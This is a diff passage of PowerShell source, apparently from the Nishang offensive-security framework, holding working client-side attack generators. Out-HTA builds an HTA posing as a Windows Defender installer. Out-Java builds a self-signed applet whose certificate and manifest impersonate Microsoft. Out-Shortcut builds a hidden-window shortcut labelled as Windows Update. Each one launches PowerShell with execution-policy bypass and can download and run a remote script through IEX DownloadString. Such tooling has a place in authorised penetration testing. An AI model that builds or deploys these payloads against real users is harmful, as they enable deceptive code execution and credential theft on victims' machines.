+<p xmlns="">Click <b>Import LMHOSTS</b>, and then select the file in the <b>Open</b> dialog box.</p>
+</content></li></ul></ddue:steps>
+
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To enable or disable NetBIOS over TCP/IP</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">To enable the use of NetBIOS over TCP/IP, click <b>Enable NetBIOS over TCP/IP</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">To disable the use of NetBIOS over TCP/IP, click <b>Disable NetBIOS over TCP/IP</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">To have the DHCP server determine whether NetBIOS over TCP/IP is enabled or disabled, click <b>Default</b>.</p>
+</content></li></ul></ddue:steps>
+</content></div><h1 class="heading">Additional references</h1><div id="sectionSection1" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">For updated detailed IT pro information about TCP/IP versions 4 and 6, see <a href="http://go.microsoft.com/fwlink/?LinkID=117437" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=117437</linkText></a> and <a href="http://go.microsoft.com/fwlink/?LinkID=71543" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=71543</linkText></a>.</p>
+</content></div></div><hr /><p /></div></body></html>
+
+"@
+
+    #Write all files to disk for compilation
+    Out-File -InputObject $CHMTableOfContents -FilePath "$OutputPath\doc.hhc" -Encoding default
+    Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
+    Out-File -InputObject $CHMHTML2 -FilePath "$OutputPath\doc1.htm" -Encoding default
+    Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
+    
+    #Compile the CHM, only this needs to be sent to a target.
+    $HHC = "$HHCPath" + "\hhc.exe"
+    & "$HHC" "$OutputPath\doc.hhp"
+
+    #Cleanup
+    Remove-Item "$OutputPath\doc.hhc"
+    Remove-Item "$OutputPath\doc.htm"
+    Remove-Item "$OutputPath\doc1.htm"
+    Remove-Item "$OutputPath\doc.hhp"
+    
+}
+
+#######################################Out-HTA#############################################
+
+function Out-HTA
+{
+<#
+.SYNOPSIS
+Nishang script which could be used for generating HTML Application and accompanying VBscript. These could be deployed on 
+a web server and powershell scripts and commands could be executed on the target machine.
+
+.DESCRIPTION
+The script generates two files. A HTA file and a VBScript. The HTA and VBScript should be deployed in same directory of a web server.
+When a target browses to the HTA file the VBScript is executed. This VBScript is used to execute powershell scripts and commands.
+
+.PARAMETER Payload
+Payload which you want execute on the target.
+
+.PARAMETER PayloadURL
+URL of the powershell script which would be executed on the target.
+
+.PARAMETER Arguments
+Arguments to the powershell script to be executed on the target.
+
+.PARAMETER HTAFilePath
+Path to the HTA file to be generated. Default is with the name WindDef_WebInstall.hta in the current directory.
+
+.PARAMETER VBFilename
+Name of the VBScript file to be generated, use without ".vbs" extension. Default is launchps.vbs.
+
+.PARAMETER VBFilepath
+Path to the HTA file to be generated. Default is with the name launchps.vbs in the current directory.
+
+.EXAMPLE
+PS > Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"
+
+Above command would execute Get-ChildItem on the target machine when the HTA is opened.
+
+.EXAMPLE
+PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1
+
+Use above command to generate HTA and VBS files which download and execute the given powershell script in memory on target.
+
+.EXAMPLE
+PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM
+
+Use above command to pass an argument to the powershell script/module.
+
+.LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://github.com/samratashok/nishang
+#>
+
+
+    [CmdletBinding()] Param(
+        
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Payload,
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $PayloadURL,
+
+        
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Arguments,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]
+        $VBFilename="launchps.vbs",
+
+        [Parameter(Position = 4, Mandatory = $False)]
+        [String]
+        $HTAFilePath="$pwd\WindDef_WebInstall.hta",
+
+
+        [Parameter(Position = 5, Mandatory = $False)]
+        [String]
+        $VBFilepath="$pwd\launchps.vbs"
+    )
+    
+    if(!$Payload)
+    {
+        $Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+    }
+    
+    $HTA = @"
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+    <title>Windows Defender Web Install</title>
+    <script src="$VBFilename" type="text/vbscript" >
+    </script>
+    <hta:application
+       id="oHTA"
+       applicationname="Windows Defender Web Install"
+       application="yes"
+    >
+    </hta:application>
+    </head>
+
+    <SCRIPT TYPE="text/javascript">
+    function start(){
+
+    Initialize();
+
+    }
+    //-->
+    </SCRIPT>
+    <div> 
+    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
+    </object></div>   
+ 
+  
+    <body onload="start()">
+    </body>
+    </html>
+"@
+
+    $vbsscript = @"
+    Sub Initialize()
+    Set oShell = CreateObject( "WScript.Shell" )
+    ps = "$Payload"
+    oShell.run(ps),0,true
+    End Sub
+"@
+
+    Out-File -InputObject $HTA -FilePath $HTAFilepath
+    Out-File -InputObject $vbsscript -FilePath $VBFilepath
+    Write-Output "HTA and VBS written to $HTAFilepath and $VBFilepath respectively."
+}
+
+
+#######################################Out-Java#############################################
+
+function Out-Java
+{
+
+<#
+.SYNOPSIS
+Nishang script which could be used for generating JAR to be used for applets.
+
+.DESCRIPTION
+The script generates a Signed JAR and one line HTML code. These could be deployed on a web server. When a target opens
+up the URL hosting these, the predefined PowerShell commands and scripts could be executed on the target.
+
+If you want to use valid/trusted certificate for signing use the -NoSelfSign option.
+
+The JAR generated checks for the OS architecture and calls the 32-bit version of PowerShell for script execution.
+So you need to pass only the 32 bit shellcode to it. In case you would like to use 64 bit PowerShell, remove the "if"
+condition marked in the source of Java code being generated.
+
+The script needs JDK to be installed on the attacker's machine. The parameters passed to keytool and jarsigner
+could be changed in the source for further customization. Those are not asked as function parameters to keep the 
+number of parameters less for easy usage.
+
+.PARAMETER Payload
+Payload which you want execute on the target.
+
+.PARAMETER $PayloadURL
+URL of the powershell script which would be executed on the target.
+
+.PARAMETER $Arguments
+Arguments to the powershell script to be executed on the target.
+
+.PARAMETER $JDKPath
+Patj to the JDK to compile the .Java code.
+
+.PARAMETER $OutputPath
+Path to the directory where the files would be saved. Default is the current directory.
+
+.PARAMETER $NoSelfSign
+Use this switch if you don't want to create a self signed certificate for signing the JAR.
+
+.EXAMPLE
+PS > Out-Java -Payload "Get-Process" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
+
+Above command would execute Get-Process on the target machine when the JAR or Class file is executed.
+
+.EXAMPLE
+PS > Out-Java -PayloadURL http://192.168.254.1/Get-Information.ps1 -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
+
+Use above command to generate JAR which download and execute the given powershell script in memory on target.
+
+.EXAMPLE
+PS > Out-Java -Payload "-e <EncodedScript>" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
+
+Use above command to generate JAR which executes the encoded script.
+Use Invoke-Command from Nishang to encode the script.
+
+.EXAMPLE
+PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
+
+Use above command to pass an argument to the powershell script/module.
+
+.EXAMPLE
+PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25" -NoSelfSign
+
+Due to the use of -NoSelfSign in above command, no self signed certificate would be used to sign th JAR.
+
+.LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://github.com/samratashok/nishang
+#>
+
+
+
+    [CmdletBinding()] Param(
+        
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Payload,
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $PayloadURL,
+
+        
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Arguments,
+
+        [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $JDKPath,
+
+        [Parameter(Position = 4, Mandatory = $False)]
+        [String]
+        $OutputPath="$pwd",
+
+        [switch]
+        $NoSelfSign
+
+
+    )
+
+
+    if(!$Payload)
+    {
+        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+    }    
+
+#Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
+    $JavaClass = @"
+import java.applet.*;
+import java.awt.*;
+import java.io.*;
+public class JavaPS extends Applet {
+public void init() {
+Process f;
+//http://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
+String arch = System.getenv("PROCESSOR_ARCHITECTURE");
+String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
+String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
+String cmd = "powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
+//Remove the below if condition to use 64 bit powershell on 64 bit machines.
+if (realArch == "64")
+{
+    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
+}
+try {
+f = Runtime.getRuntime().exec(cmd);
+}
+catch(IOException e) {
+e.printStackTrace();
+}
+Process s;
+}
+}
+"@
+
+
+    #Compile the Java file
+    $JavaFile = "$OutputPath\JavaPS.java"
+    Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile
+    $JavacPath = "$JDKPath" + "\bin\javac.exe"
+    & "$JavacPath" "$JavaFile"
+
+    #Create a manifest for JAR, taken from SET
+    $Manifest = @"
+Permissions: all-permissions
+Codebase: *
+Application-Name: Microsoft Internet Explorer Update (SECURE)
+"@
+    $ManifestFile = "$OutputPath\manifest.txt"
+    Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile
+
+    #Create the JAR
+    $Jarpath = "$JDKPath" + "\bin\jar.exe"
+    & "$JarPath" "-cvfm" "$OutputPath\JavaPS.jar" "$ManifestFile" "JavaPS.class"
+    
+    #Parameters passed to keytool and jarsigner. You may change these to your choice.
+    $KeystoreAlias = "SignApplet"
+    $KeyStore = "PSKeystore"
+    $StorePass = "PSKeystorePass"
+    $KeyPass = "PSKeyPass"
+    $DName = "cn=Windows Update, ou=Microsoft Inc, o=Microsoft Inc, c=US"
+
+    if ($NoSelfSign -eq $False)
+    {
+        #Generate a keypair for self-signing
+        #http://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
+        $KeytoolPath = "$JDKPath" + "\bin\keytool.exe"
+        & "$KeytoolPath" "-genkeypair" "-alias" "$KeystoreAlias" "-keystore" "$KeyStore" "-keypass" "$KeyPass" "-storepass" "$StorePass" "-dname" "$DName"
+
+        #Self sign the JAR
+        $JarSignerPath = "$JDKPath" + "\bin\jarsigner.exe"
+        & "$JarSignerPath" "-keystore" "$KeyStore" "-storepass" "$StorePass" "-keypass" "$KeyPass" "-signedjar" "$OutputPath\SignedJavaPS.jar" "$OutputPath\JavaPS.jar" "SignApplet"
+    
+        #Output simple html. This could be used with any cloned web page.
+        #Host this HTML and SignedJarPS.jar on a web server.
+        $HTMLCode = @'
+        <div> 
+    <object type="text/html" data="http://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
+    </object></div>
+    <applet code="JavaPS" width="1" height="1" archive="SignedJavaPS.jar" > </applet>'
+'@
+        $HTMLFile = "$OutputPath\applet.html"
+        Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   
+
+        #Cleanup
+        Remove-Item "$OutputPath\PSKeyStore"
+        Remove-Item "$OutputPath\JavaPS*"
+    }
+    elseif ($NoSelfSign -eq $True)
+    {
+        Write-Warning "You chose not to self sign. Use your valid certificate to sign the JavaPS.jar manually."
+        #Cleanup
+        Remove-Item "$OutputPath\JavaPS.java"
+        Remove-Item "$OutputPath\JavaPS.class"
+    }    
+    #Cleanup to remove temporary files
+    Remove-Item "$OutputPath\manifest.txt"
+}
+
+
+#######################################Out-Shortcut#############################################
+
+function Out-Shortcut
+{
+<#
+.SYNOPSIS
+Nishang script which creates a shortcut capable of launching PowerShell commands and scripts.
+
+.DESCRIPTION
+The script generates a shortcut (.lnk). When a target opens the shortcut, the predefined powershell scripts and/or commands get executed.
+A hotkey for the shortcut could also be generated. Also, the icon of the shortcut could be set too.
+
+.PARAMETER Payload
+Payload which you want execute on the target.
+
+.PARAMETER PayloadURL
+URL of the powershell script which would be executed on the target.
+
+.PARAMETER Arguments
+Arguments to the powershell script to be executed on the target.
+
+.PARAMETER OutputPath
+Path to the .lnk file to be generated. Default is with the name Shortcut to File Server.lnk in the current directory.
+
+.PARAMETER Hotkey
+The Hotkey to be assigned to the shortcut. Default is F5.
+
+.PARAMETER Icon
+The Icon to be assigned to the generated shortcut. Default is that of explorer.exe
+
+.EXAMPLE
+PS > Out-Shortcut -Payload "-WindowStyle hidden -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"
+
+Above command would execute Get-ChildItem on the target machine when the shortcut is opened. Note that powershell.exe is 
+not a part of the payload as the shortcut already points to it.
+
+.EXAMPLE
+PS > Out-Shortcut -PayloadURL http://192.168.254.1/Get-Wlan-Keys.ps1
+
+Use above command to generate a Shortcut which download and execute the given powershell script in memory on target.
+
+.EXAMPLE
+PS > Out-Shortcut -Payload "-EncodedCommand <>"
+
+Use above command to generate a Shortcut which executes the given encoded command/script.
+Use Invoke-Encode from Nishang to encode the command or script.
+
+
+.EXAMPLE
+PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM
+
+Use above command to pass an argument to the powershell script/module.
+
+.EXAMPLE
+PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3'
+
+Use above command to assign F3 as hotkey to the shortcut
+
+.EXAMPLE
+PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3' -Icon 'notepad.exe'
+
+Use above command to assign notepad icon to the generated shortcut.
+
+.LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://github.com/samratashok/nishang
+http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Payload,
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $PayloadURL,
+
+        
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Arguments,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]
+        $OutputPath = "$pwd\Shortcut to File Server.lnk",
+
+        [Parameter(Position = 4, Mandatory = $False)]
+        [String]
+        $HotKey = 'F5',
+
+
+        [Parameter(Position = 5, Mandatory = $False)]
+        [String]
+        $Icon='explorer.exe'
+
+
+
+
+    )
+    if(!$Payload)
+    {
+        $Payload = " -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+    }
+    $WshShell = New-Object -comObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($OutputPath)
+    $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+    $Shortcut.Description = "Shortcut to Windows Update Commandline"
+    $Shortcut.WindowStyle = 7
+    $Shortcut.Hotkey = $HotKey
+    $Shortcut.IconLocation = "$Icon,0"
+    $Shortcut.Arguments = $Payload
+    $Shortcut.Save()
+    Write-Output "The Shortcut file has been written as $OutputPath"
+
+}
+##################################End of Client Side Attack functions###############################
